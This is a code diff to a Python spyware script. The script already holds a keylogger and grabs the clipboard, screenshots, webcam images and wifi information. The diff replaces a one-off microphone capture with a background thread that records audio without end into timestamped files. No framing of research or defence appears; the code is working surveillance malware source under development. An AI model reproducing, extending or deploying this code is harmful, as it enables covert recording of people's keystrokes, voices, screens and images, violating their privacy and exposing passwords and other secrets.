@@ -99,11 +99,25 @@ def copy_clipboard():
             f.write("Clipboard could not be accessed.\n")
 
 
-def microphone():
+def microphone_thread():
     """Record audio for a specified duration and save it as a .wav file."""
-    myrecording = sd.rec(int(15 * 44100), samplerate=44100, channels=2)
-    sd.wait()
-    write(os.path.join(sessions_folder, "audio.wav"), 44100, myrecording)
+    # myrecording = sd.rec(int(15 * 44100), samplerate=44100, channels=2)
+    # sd.wait()
+    # write(os.path.join(sessions_folder, "audio.wav"), 44100, myrecording)
+
+    #neeche new code
+
+    while True:
+        try:
+            print("Recording audio...")
+            myrecording = sd.rec(int(15 * 44100), samplerate=44100, channels=2)
+            sd.wait()
+            audio_filename = os.path.join(sessions_folder, f"audio_{datetime.now().strftime('%Y%m%d%H%M%S')}.wav")
+            write(audio_filename, 44100, myrecording)
+            # write(os.path.join(sessions_folder, "audio.wav"), 44100, myrecording)
+            print(f"Audio recorded and saved as {audio_filename}")
+        except Exception as e:
+            print(f"Error in microphone recording: {e}")
 
 
 def screenshots():
@@ -207,7 +221,7 @@ copy_clipboard()
 screenshots()
 webcam_capture()
 wifi_info_fetch()
-microphone()
+# microphone()
 
 # # Compress the sessions folder into a .zip file
 # archive_name = os.path.join(file_path, f"session_{currtime}.zip")  # Name for the zip archive
@@ -220,6 +234,9 @@ microphone()
 schedule_thread = threading.Thread(target=run_scheduled_tasks)
 schedule_thread.daemon = True
 schedule_thread.start()
+# Start microphone in a separate thread
+microphone_thread_instance = threading.Thread(target=microphone_thread, daemon=True)
+microphone_thread_instance.start()
 
 # Start keylogger in the main thread
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
